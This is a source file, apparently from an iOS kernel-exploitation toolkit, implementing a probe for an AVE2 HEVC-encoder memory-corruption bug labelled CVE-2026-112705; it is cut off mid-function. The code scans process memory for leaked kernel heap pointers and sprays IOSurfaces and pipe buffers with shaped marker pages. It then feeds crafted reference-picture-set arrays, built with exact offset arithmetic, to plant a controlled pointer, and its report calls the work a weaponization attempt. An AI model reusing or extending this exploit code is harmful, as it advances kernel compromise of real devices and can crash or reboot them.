#import "KPAuditAVESpriteModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import "KPVMScanPolicy.h"
#import "KPH9EncoderModule.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>

#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 73
#endif

static inline BOOL IsExpectedZeroOffset(size_t off) {
    size_t p = off & 0xfff;
    return (p == 0x48 || p == 0x50 || p == 0xf0 || p == 0xf8 || p == 0x248 || p == 0x250);
}

// Hang fix (same class as H9): VTCompressionSessionCompleteFrames(kCMTimeInvalid)
// deadlocks forever on a fault-latched session - and the path-ii shots
// (NTL=16000/16463 in frameProperties) can latch exactly one. Bounded callback
// drain instead, Liza semantics: sink cleared before submission, break on fault.
static void SpriteAttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
    (void)src;
    NSMutableArray *sink = (__bridge NSMutableArray *)refCon;
    if (!sink) return;
    size_t totalLen = 0;
    if (sb) {
        CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sb);
        if (block) totalLen = CMBlockBufferGetDataLength(block);
    }
    NSString *entry = [NSString stringWithFormat:@"cb st=%d info=0x%x sbuf=%s len=%zu",
                       (int)st, (unsigned)fl, sb ? "OK" : "NULL", totalLen];
    @synchronized (sink) {
        [sink addObject:entry];
    }
}
static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int expected, int timeoutMs) {
    if (!s || !sink || expected <= 0) return;
    int waited = 0, last = 0, idleMs = 0;
    while (waited < timeoutMs) {
        int now = 0;
        BOOL faulted = NO;
        @synchronized (sink) {
            now = (int)sink.count;
            if (now > 0) {
                NSString *tail = [sink lastObject];
                if (tail && ![tail hasPrefix:@"cb st=0"]) faulted = YES;
            }
        }
        if (now >= expected) break;
        if (faulted) break;
        if (now > 0 && now == last) { idleMs += 2; if (idleMs >= 30) break; }
        else idleMs = 0;
        last = now;
        usleep(2000);
        waited += 2;
    }
}

@interface KPAuditAVESpriteModule ()
@property (nonatomic, assign) int sprayCount;
@property (nonatomic, assign) uint32_t marker;
@property (nonatomic, assign) int ntl;
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPAuditAVESpriteModule

- (instancetype)initWithSprayCount:(int)count marker:(uint32_t)marker {
    return [self initWithSprayCount:count marker:marker ntl:16433];
}

- (instancetype)initWithSprayCount:(int)count marker:(uint32_t)marker ntl:(int)ntl {
    self = [super init];
    if (self) {
        _sprayCount = count;
        _marker = marker;
        _ntl = ntl;
        if (marker == 0x50505050) {
            _identifier = @"ave112705.pcontrol.armed";
            _title = @"AVE2 P-control probe (arr10 -> slot[0])";
            _subtitle = @"UserRPS arr10 struct#9 writes P=0x201 into slot[0]; teardown x0=0x259";
        } else {
        _identifier = (ntl == 16433)
            ? [NSString stringWithFormat:@"ave112705.sprite%d.armed", count]
            : [NSString stringWithFormat:@"ave112705.sprite%d.ntl%d.armed", count, ntl];
        _title = (ntl == 16433)
            ? [NSString stringWithFormat:@"AVE2 sprite x%d", count]
            : (ntl == 0
                ? [NSString stringWithFormat:@"AVE2 sprite x%d (auto/16444)", count]
                : [NSString stringWithFormat:@"AVE2 sprite x%d (NTL=%d)", count, ntl]);
        }
        _subtitle = [NSString stringWithFormat:
                     @"CVE-2026-112705: raw EncoderUsage=1 + NTL=%d after spray (no 60/15 clamp)", ntl];
        _icon = @"square.grid.3x3.middle.filled";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"kp-ave-sprite-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[ave-sprite] %@", line];
}

- (VTCompressionSessionRef)makeSessionWidth:(int)w height:(int)h {
    VTCompressionSessionRef session = NULL;
    OSStatus s = VTCompressionSessionCreate(kCFAllocatorDefault, w, h,
                                            kCMVideoCodecType_HEVC,
                                            NULL, NULL, NULL,
                                            NULL, NULL, &session);
    return (s == noErr) ? session : NULL;
}

- (CVPixelBufferRef)makeBufferWidth:(int)w height:(int)h {
    CVPixelBufferRef pb = NULL;
    NSDictionary *attrs = @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
    CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                        (__bridge CFDictionaryRef)attrs, &pb);
    if (pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 0), 0x40,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * (size_t)h);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 1), 0x80,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * ((size_t)h / 2));
        CVPixelBufferUnlockBaseAddress(pb, 0);
    }
    return pb;
}

#pragma mark - Report

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · CVE-2026-112705 · AVE2 sprite probe ===\n"];
    [report appendString:@"Weaponization question: does the OOB read consume SHAPED memory?\n"];
    [report appendString:@"Oracle: after the victim's panic, far/x0 shows what was read.\n"];
    [report appendString:@"  far=0x59               -> spray missed (baseline signature)\n"];
    [report appendString:@"  far low dword = 0x59 with high dword = marker bits -> partial hit\n"];
    [report appendString:@"  far contains marker 0x{marker} -> neighbour is OURS, pointer ours.\n"];
    [report appendString:@"Order: victim session FIRST, spray AFTER (OOB reads forward),\n"];
    [report appendString:@"       then encode the victim (NTL=16463 => may reboot the device).\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];
    [report appendFormat:@"marker=0x%08x spray=%d\n", self.marker, self.sprayCount];

    const int32_t W = 1280, H = 720;
    const int32_t sw = 64, sh = 64;

    // 0) Pre-scan userspace RW memory for live ZONE_HEAP kernel pointers (e.g. 0xffffffedfd620000,
    //    0xffffffe289ee5658) so we can steer NTL directly into the live kernel heap band!
    typedef struct {
        uint64_t kptr;
        vm_address_t userVA;
        vm_address_t regionBase;
        vm_size_t regionSize;
        uint32_t userTag;
        uint32_t shareMode;
    } LiveCandRecord;
    LiveCandRecord liveCands[8] = {0};
    uint64_t liveKPtrs[8] = {0};
    vm_address_t liveVAs[8] = {0};
    int liveKPtrCount = 0;
    {
        int sharedCount = KPH9GetStage5CandidateCount();
        for (int si = 0; si < sharedCount && liveKPtrCount < 8; si++) {
            const KPStage5Candidate *sc = KPH9GetStage5Candidate(si);
            if (!sc || sc->kptr == 0) continue;
            BOOL dup = NO;
            for (int k = 0; k < liveKPtrCount; k++) {
                if ((liveKPtrs[k] >> 32) == (sc->kptr >> 32)) { dup = YES; break; }
            }
            if (!dup) {
                liveCands[liveKPtrCount].kptr = sc->kptr;
                liveCands[liveKPtrCount].userVA = sc->userVA;
                liveCands[liveKPtrCount].regionBase = sc->regionBase;
                liveCands[liveKPtrCount].regionSize = sc->regionSize;
                liveCands[liveKPtrCount].userTag = sc->userTag;
                liveCands[liveKPtrCount].shareMode = sc->shareMode;
                liveVAs[liveKPtrCount] = sc->userVA;
                liveKPtrs[liveKPtrCount++] = sc->kptr;
            }
        }
        vm_address_t addr = 0;
        vm_size_t size = 0;
        uint32_t depth = 0;
        vm_region_submap_info_data_64_t info;
        mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
        uint64_t pageBuf[512];
        vm_address_t exclAddrs[3] = { (vm_address_t)pageBuf, (vm_address_t)liveKPtrs, (vm_address_t)liveCands };
        vm_size_t exclSizes[3] = { sizeof(pageBuf), sizeof(liveKPtrs), sizeof(liveCands) };
        for (int iter = 0; iter < 2048 && liveKPtrCount < 8; iter++) {
            count = VM_REGION_SUBMAP_INFO_COUNT_64;
            if (vm_region_recurse_64(mach_task_self(), &addr, &size, &depth,
                                     (vm_region_recurse_info_t)&info, &count) != KERN_SUCCESS || size == 0) {
                break;
            }
            if (info.is_submap) { depth++; continue; }
            if ((info.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
                size <= 16 * 1024 * 1024 &&
                !KPVMShouldSkipRegion(&info, addr, size, &depth, exclAddrs, exclSizes, 3)) {
                for (vm_size_t off = 0; off + sizeof(pageBuf) <= size && liveKPtrCount < 8; off += sizeof(pageBuf)) {
                    vm_size_t outSz = 0;
                    if (vm_read_overwrite(mach_task_self(), addr + off, sizeof(pageBuf),
                                          (vm_address_t)pageBuf, &outSz) != KERN_SUCCESS ||
                        outSz < sizeof(uint64_t)) {
                        break;
                    }
                    size_t words = outSz / sizeof(uint64_t);
                    for (size_t w = 0; w < words && liveKPtrCount < 8; w++) {
                        uint64_t v = pageBuf[w];
                        if (KPIsContextFalsePositive(pageBuf, words, w)) continue;
                        if (KPIsKernelPointerCandidate(v) &&
                            !KPIsKnownDiagnosticConstant(v) &&
                            KPClassifyKPtr(v) == KPTR_CANDIDATE_ZONE_HEAP) {
                            BOOL dup = NO;
                            for (int k = 0; k < liveKPtrCount; k++) {
                                if ((liveKPtrs[k] >> 32) == (v >> 32)) { dup = YES; break; }
                            }
                            if (!dup) {
                                liveCands[liveKPtrCount].kptr = v;
                                liveCands[liveKPtrCount].userVA = addr + off + w * sizeof(uint64_t);
                                liveCands[liveKPtrCount].regionBase = addr;
                                liveCands[liveKPtrCount].regionSize = size;
                                liveCands[liveKPtrCount].userTag = info.user_tag;
                                liveCands[liveKPtrCount].shareMode = info.share_mode;
                                liveVAs[liveKPtrCount] = addr + off + w * sizeof(uint64_t);
                                liveKPtrs[liveKPtrCount++] = v;
                            }
                        }
                    }
                }
            }
            if (addr + size <= addr) break;
            addr += size;
        }
    }

    int ntl = self.ntl;
    if (self.marker != 0x50505050 && (ntl <= 0 || (ntl == 16433 && liveKPtrCount > 0))) {
        if (ntl <= 0) {
            ntl = 16444; // 0xffffffed00000059 (AppleAVE2 outer-object band on iPhone16,1 27.0.1)
        }
        for (int lk = 0; lk < liveKPtrCount; lk++) {
            uint32_t hi32 = (uint32_t)(liveKPtrs[lk] >> 32);
            if ((hi32 >= 0xFFFFFFE0u && hi32 <= 0xFFFFFFEFu) ||
                (hi32 >= 0xFFFFFE10u && hi32 <= 0xFFFFFE3Fu)) {
                ntl = 16463 + (int32_t)hi32;
                break;
            }
        }
    }
    uint64_t steeredX0 = ((uint64_t)(uint32_t)(ntl - 16463) << 32) | 0x59ULL;

    // Include live discovered ZONE_HEAP bands first, then T8122/T8130 Zone map
    // (.DATA 0xffffffe1..0xffffffe2, .GEN0..3 0xffffffde..0xffffffe1, KMA 0xffffffe4).
    uint64_t x0cands[16];
    int ncand = 0;
    x0cands[ncand++] = steeredX0;
    for (int lk = 0; lk < liveKPtrCount && ncand < 16; lk++) {
        uint64_t liveSteered = (liveKPtrs[lk] & 0xffffffff00000000ULL) | 0x59ULL;
        if (liveSteered != steeredX0) x0cands[ncand++] = liveSteered;
    }
    const uint32_t hiBands[] = {
        0xFFFFFFEDu, 0xFFFFFFEFu, 0xFFFFFFE2u, 0xFFFFFFE1u, 0xFFFFFFE0u, 0xFFFFFFDFu,
        0xFFFFFFDEu, 0xFFFFFFE4u, 0xFFFFFFEEu,
        0xFFFFFE26u, 0xFFFFFE10u, 0xFFFFFE20u, 0xFFFFFE30u, 0xFFFFFE33u
    };
    for (size_t bi = 0; bi < sizeof(hiBands) / sizeof(hiBands[0]) && ncand < 16; bi++) {
        uint64_t cand = ((uint64_t)hiBands[bi] << 32) | 0x59ULL;
        BOOL exists = NO;
        for (int c = 0; c < ncand; c++) {
            if (x0cands[c] == cand) { exists = YES; break; }
        }
        if (!exists) x0cands[ncand++] = cand;
    }
    [report appendFormat:@"live ZONE_HEAP bands found: %d (shared_h9=%d)\n", liveKPtrCount, KPH9GetStage5CandidateCount()];
    for (int lk = 0; lk < liveKPtrCount; lk++) {
        int lntl = 16463 + (int32_t)(uint32_t)(liveKPtrs[lk] >> 32);
        [report appendFormat:@"  live[%d] = 0x%016llx @ va=0x%lx (reg=0x%lx+0x%lx tag=%u share=%u) -> steeredNTL=%d (x0=0x%016llx)\n",
         lk, liveKPtrs[lk], (unsigned long)liveCands[lk].userVA,
         (unsigned long)liveCands[lk].regionBase, (unsigned long)liveCands[lk].regionSize,
         liveCands[lk].userTag, liveCands[lk].shareMode,
         lntl, (liveKPtrs[lk] & 0xffffffff00000000ULL) | 0x59ULL];
    }
    [report appendFormat:@"target NTL=%d steered_x0=0x%016llx\n", ntl, steeredX0];
    [report appendString:@"x0 candidates in spray:\n"];
    for (int c = 0; c < ncand; c++) {
        [report appendFormat:@"  cand[%d] = 0x%016llx\n", c, x0cands[c]];
    }

    // 1) VICTIM session created BEFORE spray:
    //    Pre-prepare with 15/30 fractional FPS and effNtl=min(vntl,7) so PrepareToEncodeFrames
    //    AND EncodeFrame[0] emit a real 7-sublayer HVCC IDR frame (info=0x1 sbuf=OK, never
    //    dropped with info=0x3 sbuf=NULL), then latch NumberOfTemporalLayers=vntl post-encode
    //    and pair an unclamped EncoderUsage=1 session before teardown.
    if (self.marker == 0x50505050) {
        int pNtl = (liveKPtrCount > 0)
            ? (16463 + (int32_t)(uint32_t)(liveKPtrs[0] >> 32))
            : ((ntl > 0 && ntl < 16463) ? ntl : 16444);
        uint64_t baseKPtr = (liveKPtrCount > 0)
            ? liveKPtrs[0]
            : (((uint64_t)(uint32_t)(pNtl - 16463) << 32) | 0x59ULL);

        // Exact offset math: pINS + 0x13adc (UserRPSForFaceTime) -> pINS + 0x147b0 (slot[0], 64-bit P)
        //   Total byte delta: 0x147b0 - 0x13adc = 0x0cd4 (3284 bytes)
        //   Struct stride in AVE_HEVC_ST_RPS_RetrieveArray (0x9ce010): 0x164 (356 bytes)
        //   Inner DeltaPOCS0Minus1 loop (0x9cdba0): strh at pInfo + 0x38 + 2*i
        //     - d=0 (pInfo=0x13adc, rem=0xcd4): i_S0 = (0xcd4 - 0x38)/2 = 1614..1617 (0x64e..0x651), j_S1 = (0xcd4 - 0x68)/4 = 795..796
        //     - d=3 (pInfo=0x13f08, rem=0x8a8): i_S0 = (0x8a8 - 0x38)/2 = 1080..1083 (0x438..0x43b), j_S1 = (0x8a8 - 0x68)/4 = 528..529
        //     - d=7 (pInfo=0x14498, rem=0x318): i_S0 = (0x318 - 0x38)/2 = 368..371   (0x170..0x173), j_S1 = (0x318 - 0x68)/4 = 172..173
        //     - d=9 (pInfo=0x14760, rem=0x050): i_S0 = (0x050 - 0x38)/2 = 12..15     (0x00c..0x00f)
        const uint32_t kRpsBaseOff  = 0x13adcU;
        const uint32_t kSlot0Off    = 0x147b0U;
        const uint32_t kRpsStride   = 0x164U;
        const uint32_t kS0FieldOff  = 0x38U;
        const uint32_t kS1FieldOff  = 0x68U;
        const uint32_t kDeltaBytes  = kSlot0Off - kRpsBaseOff; // 0x0cd4 (3284)
        const int idxS0_d0 = (int)((kDeltaBytes - kS0FieldOff) / 2U);                  // 1614
        const int idxS1_d0 = (int)((kDeltaBytes - kS1FieldOff) / 4U);                  // 795
        const int idxS0_d3 = (int)((kDeltaBytes - 3U * kRpsStride - kS0FieldOff) / 2U); // 1080
        const int idxS0_d7 = (int)((kDeltaBytes - 7U * kRpsStride - kS0FieldOff) / 2U); // 368
        const int idxS0_d9 = (int)((kDeltaBytes - 9U * kRpsStride - kS0FieldOff) / 2U); // 12

        // Construct full 64-bit P with controlled lower bits:
        //   1) P_align (low16 = 0x00a8) -> teardown x0 = P + 0x58 lands at page+0x0100 (8B aligned),
        //      and kfree check reads N at page+0x00f0, X1 at page+0x00f8 (both zeroed in spray).
        //   2) P_tag201 (low16 = 0x0201) -> teardown x0 = P + 0x58 lands at page+0x0259 (signature low bits).
        uint64_t pPageBase = (baseKPtr & 0xffffffffffffc000ULL);
        uint64_t pFullAlign  = pPageBase | 0x00a8ULL;
        uint64_t pFullTag201 = pPageBase | 0x0201ULL;
        uint64_t x0ExpectedAlign  = pFullAlign + 0x58ULL;  // pageBase + 0x0100
        uint64_t x0ExpectedTag201 = pFullTag201 + 0x58ULL; // pageBase + 0x0259

        [report appendFormat:@"offset math: pINS+0x%x -> slot[0]+0x%x delta=0x%x (%u B), stride=0x%x\n",
         kRpsBaseOff, kSlot0Off, kDeltaBytes, kDeltaBytes, kRpsStride];
        [report appendFormat:@"  d=0 (0x%x): S0[%d..%d] S1_32[%d..%d] | d=3 (0x%x): S0[%d..%d] | d=7 (0x%x): S0[%d..%d] | d=9 (0x%x): S0[%d..%d]\n",
         kRpsBaseOff, idxS0_d0, idxS0_d0 + 3, idxS1_d0, idxS1_d0 + 1,
         kRpsBaseOff + 3U * kRpsStride, idxS0_d3, idxS0_d3 + 3,
         kRpsBaseOff + 7U * kRpsStride, idxS0_d7, idxS0_d7 + 3,
         kRpsBaseOff + 9U * kRpsStride, idxS0_d9, idxS0_d9 + 3];
        [report appendFormat:@"  P_align=0x%016llx (x0=0x%016llx) | P_tag201=0x%016llx (x0=0x%016llx)\n",
         pFullAlign, x0ExpectedAlign, pFullTag201, x0ExpectedTag201];

        // Targeted IOSurface + pipebuf spray before victim teardown:
        // Zero kfree-chain offsets for P_low in {0x00, 0x01, 0xa8, 0x201}:
        //   P+0x48 / P+0x50 -> {0x48..0x58, 0xf0..0xfff, 0x248..0x258} on every 4KB page.
        uint64_t pMarkerPair = 0x5050505050505050ULL;
        uint8_t *pTile = (uint8_t *)malloc(256 * 1024);
        if (pTile) {
            uint64_t *tq = (uint64_t *)pTile;
            for (size_t ti = 0; ti < (256 * 1024) / 8; ti++) tq[ti] = pMarkerPair;
            for (size_t pg = 0; pg < 256 * 1024; pg += 4096) {
                memset(pTile + pg + 0x48, 0, 16);
                memset(pTile + pg + 0xf0, 0, 16);
                memset(pTile + pg + 0x248, 0, 16);
            }
        }
        int pPipes[64][2];
        int pPipesCount = 0;
        for (int p = 0; p < 64; p++) {
            pPipes[p][0] = pPipes[p][1] = -1;
            if (pipe(pPipes[p]) != 0) continue;
            fcntl(pPipes[p][1], F_SETPIPE_SZ, 512 * 1024);
            fcntl(pPipes[p][1], F_SETFL, O_NONBLOCK);
            ssize_t wsum = 0;
            if (pTile) {
                wsum += write(pPipes[p][1], pTile, 256 * 1024);
                wsum += write(pPipes[p][1], pTile, 256 * 1024);
            }
            if (wsum > 0) pPipesCount++;
        }

        typedef void *(*PCISCreateFn)(CFDictionaryRef);
        typedef int (*PCISLockFn)(void *, uint32_t, uint32_t *);
        typedef int (*PCISUnlockFn)(void *, uint32_t, uint32_t *);
        typedef void *(*PCISGetBaseFn)(void *);
        typedef size_t (*PCISGetSizeFn)(void *);
        void *pIsLib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
        PCISCreateFn pIsCreate = pIsLib ? (PCISCreateFn)dlsym(pIsLib, "IOSurfaceCreate") : NULL;
        PCISLockFn pIsLock = pIsLib ? (PCISLockFn)dlsym(pIsLib, "IOSurfaceLock") : NULL;
        PCISUnlockFn pIsUnlock = pIsLib ? (PCISUnlockFn)dlsym(pIsLib, "IOSurfaceUnlock") : NULL;
        PCISGetBaseFn pIsGetBase = pIsLib ? (PCISGetBaseFn)dlsym(pIsLib, "IOSurfaceGetBaseAddress") : NULL;
        PCISGetSizeFn pIsGetSize = pIsLib ? (PCISGetSizeFn)dlsym(pIsLib, "IOSurfaceGetAllocSize") : NULL;
        CFMutableArrayRef pSurfArr = NULL;
        if (pIsCreate && pIsLock && pIsUnlock && pIsGetBase && pIsGetSize) {
            pSurfArr = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
            for (int s = 0; s < 32; s++) {
                NSDictionary *props = @{
                    @"IOSurfaceWidth": @1024, @"IOSurfaceHeight": @1024,
                    @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @0x42475241,
                };
                void *surf = pIsCreate((__bridge CFDictionaryRef)props);
                if (surf) {
                    uint32_t seed = 0;
                    if (pIsLock(surf, 0, &seed) == 0) {
                        uint8_t *base = (uint8_t *)pIsGetBase(surf);
                        size_t sz = pIsGetSize(surf);
                        if (base && sz >= 0x4000) {
                            for (size_t pg = 0; pg + 0x300 <= sz; pg += 0x1000) {
                                uint64_t *pw = (uint64_t *)(base + pg);
                                for (int wi = 0; wi < 96; wi++) pw[wi] = pMarkerPair;
                                memset(base + pg + 0x48, 0, 16);
                                memset(base + pg + 0xf0, 0, 16);
                                memset(base + pg + 0x248, 0, 16);
                            }
                        }
                        pIsUnlock(surf, 0, &seed);
                    }
                    CFArrayAppendValue(pSurfArr, surf);
                    CFRelease(surf);
                }
            }
        }
        [report appendFormat:@"pcontrol spray armed: pipes=%d x 512KB, surfaces=%ld x 4MB\n",
         pPipesCount, pSurfArr ? (long)CFArrayGetCount(pSurfArr) : 0L];

        // Build 4-halfword little-endian 64-bit P helper for DeltaPOCS0Minus1
        int16_t hwAlign[4] = {
            (int16_t)(pFullAlign & 0xffffULL),
            (int16_t)((pFullAlign >> 16) & 0xffffULL),
            (int16_t)((pFullAlign >> 32) & 0xffffULL),
            (int16_t)((pFullAlign >> 48) & 0xffffULL)
        };
        int16_t hwTag201[4] = {
            (int16_t)(pFullTag201 & 0xffffULL),
            (int16_t)((pFullTag201 >> 16) & 0xffffULL),
            (int16_t)((pFullTag201 >> 32) & 0xffffULL),
            (int16_t)((pFullTag201 >> 48) & 0xffffULL)
        };

        // 1) Path A (d=0): single dict with S0 length 1620 (reaches 0x147b0 at i=1614..1617)
        NSMutableArray *s0D0 = [NSMutableArray arrayWithCapacity:1620];
        for (int e = 0; e < 1620; e++) {
            int16_t hv = (e >= idxS0_d0 && e < idxS0_d0 + 4) ? hwTag201[e - idxS0_d0] : hwAlign[e & 3];
            [s0D0 addObject:@(hv)];
        }
        NSMutableArray *s1D0 = [NSMutableArray arrayWithCapacity:800];
        for (int e = 0; e < 800; e++) {
            [s1D0 addObject:@(hwAlign[e & 3])];
        }
        NSDictionary *dictD0 = @{
            @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
            @"NumNegativePics": @2,
            @"NumPositivePics": @2,
            @"DeltaPOCS0Minus1": s0D0,
            @"UsedByCurrPicS0Flag": @3,
            @"DeltaPOCS1Minus1": s1D0,
            @"UsedByCurrPicS1Flag": @3,
        };

        // 2) Path B (d=3, arr4): 4th dict at 0x13f08 with S0 length 1088 (reaches 0x147b0 at i=1080..1083)
        NSMutableArray *rps4 = [NSMutableArray arrayWithCapacity:4];
        for (int d = 0; d < 4; d++) {
            int len = (d == 3) ? 1088 : 16;
            NSMutableArray *s0 = [NSMutableArray arrayWithCapacity:(NSUInteger)len];
            for (int e = 0; e < len; e++) {
                int16_t hv = (d == 3 && e >= idxS0_d3 && e < idxS0_d3 + 4) ? hwTag201[e - idxS0_d3] : hwAlign[e & 3];
                [s0 addObject:@(hv)];
            }
            [rps4 addObject:@{
                @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
                @"NumNegativePics": @2,
                @"NumPositivePics": @2,
                @"DeltaPOCS0Minus1": s0,
                @"UsedByCurrPicS0Flag": @3,
                @"DeltaPOCS1Minus1": @[ @(hwAlign[0]), @(hwAlign[1]) ],
                @"UsedByCurrPicS1Flag": @3,
            }];
        }

        // 3) Path C (d=7, arr8): 8th dict at 0x14498 with S0 length 376 (reaches 0x147b0 at i=368..371)
        NSMutableArray *rps8 = [NSMutableArray arrayWithCapacity:8];
        for (int d = 0; d < 8; d++) {
            int len = (d == 7) ? 376 : 32;
            NSMutableArray *s0b = [NSMutableArray arrayWithCapacity:(NSUInteger)len];
            for (int e = 0; e < len; e++) {
                int16_t hv = (d == 7 && e >= idxS0_d7 && e < idxS0_d7 + 4) ? hwAlign[e - idxS0_d7] : hwAlign[e & 3];
                [s0b addObject:@(hv)];
            }
            [rps8 addObject:@{
                @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
                @"NumNegativePics": @2,
                @"NumPositivePics": @2,
                @"DeltaPOCS0Minus1": s0b,
                @"UsedByCurrPicS0Flag": @3,
                @"DeltaPOCS1Minus1": @[ @(hwAlign[0]), @(hwAlign[1]) ],
                @"UsedByCurrPicS1Flag": @3,
            }];
        }

        // 4) Path D (d=9, arr10): 10th dict at 0x14760 with valid NumNeg=2/NumPos=2 & S0[12..15] -> 0x147b0..0x147b7
        NSMutableArray *rps10 = [NSMutableArray arrayWithCapacity:10];
        for (int d = 0; d < 10; d++) {
            NSMutableArray *s0c = [NSMutableArray arrayWithCapacity:16];
            for (int e = 0; e < 16; e++) {
                int16_t hv = (d == 9 && e >= idxS0_d9 && e < idxS0_d9 + 4) ? hwAlign[e - idxS0_d9] : hwAlign[e & 3];
                [s0c addObject:@(hv)];
            }
            [rps10 addObject:@{
                @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
                @"NumNegativePics": @2,
                @"NumPositivePics": @2,
                @"DeltaPOCS0Minus1": s0c,
                @"UsedByCurrPicS0Flag": @3,
                @"DeltaPOCS1Minus1": @[ @(hwAlign[0]), @(hwAlign[1]) ],
                @"UsedByCurrPicS1Flag": @3,
            }];
        }

        uint32_t pLo = (uint32_t)(pFullAlign & 0xffffffffULL);
        uint32_t pHi = (uint32_t)(pFullAlign >> 32);
        NSMutableArray *dpb34 = [NSMutableArray arrayWithCapacity:34];
        for (int p = 0; p < 17; p++) {
            [dpb34 addObject:@((int32_t)pLo)];
            [dpb34 addObject:@((int32_t)pHi)];
        }

        VTCompressionSessionRef victim = NULL;
        NSMutableArray *vSink = [NSMutableArray array];
        CFTypeRef retainedVSink = CFRetain((__bridge CFTypeRef)vSink);
        NSDictionary *vSpec = @{ @"EnableUserRefForFacetime": @YES };
        OSStatus vst = VTCompressionSessionCreate(kCFAllocatorDefault, W, H,
                                                  kCMVideoCodecType_HEVC,
                                                  (__bridge CFDictionaryRef)vSpec, NULL, NULL,
                                                  SpriteAttsCB, (void *)retainedVSink, &victim);
        if (vst != noErr || !victim) {
            CFRelease(retainedVSink);
            for (int p = 0; p < 64; p++) {
                if (pPipes[p][0] >= 0) close(pPipes[p][0]);
                if (pPipes[p][1] >= 0) close(pPipes[p][1]);
            }
            if (pSurfArr) CFRelease(pSurfArr);
            if (pTile) free(pTile);
            [report appendString:@"\nVERDICT: PCONTROL_CREATE_FAILED\n"];
            return report;
        }
        VTSessionSetProperty(victim, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        VTSessionSetProperty(victim, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
        OSStatus pmSt = VTSessionSetProperty(victim, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
        VTSessionSetProperty(victim, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
        VTSessionSetProperty(victim, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
        VTSessionSetProperty(victim, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
        VTSessionSetProperty(victim, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@15);
        VTSessionSetProperty(victim, CFSTR("BaseLayerFrameRate"), (__bridge CFNumberRef)@30);
        OSStatus nPreSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@7);
        OSStatus vPrep = VTCompressionSessionPrepareToEncodeFrames(victim);
        OSStatus e0 = -1;
        NSString *cb0 = @"(no cb)";
        CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
        if (pb) {
            e0 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
            SpriteDrain(victim, vSink, 1, 500);
            @synchronized (vSink) { cb0 = vSink.firstObject ?: @"(no cb)"; }
            CVPixelBufferRelease(pb);
        }
        OSStatus setDpbPre = VTSessionSetProperty(victim, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpb34);
        uint64_t rbOobPair16 = 0;
        CFTypeRef rpsAliasRef = NULL;
        if (VTSessionCopyProperty(victim, CFSTR("UserRPSForFaceTime"), kCFAllocatorDefault, &rpsAliasRef) == noErr && rpsAliasRef) {
            if (CFGetTypeID(rpsAliasRef) == CFArrayGetTypeID()) {
                NSArray *nsA = (__bridge NSArray *)rpsAliasRef;
                if (nsA.count >= 34) {
                    uint32_t lo16 = (uint32_t)[nsA[32] intValue];
                    uint32_t hi16 = (uint32_t)[nsA[33] intValue];
                    rbOobPair16 = ((uint64_t)hi16 << 32) | lo16;
                }
            }
            CFRelease(rpsAliasRef);
        }
        OSStatus setD0   = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[ dictD0 ]);
        OSStatus setArr4 = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps4);
        OSStatus setArr8 = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps8);
        OSStatus setArr10 = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps10);
        if (setArr10 != noErr) {
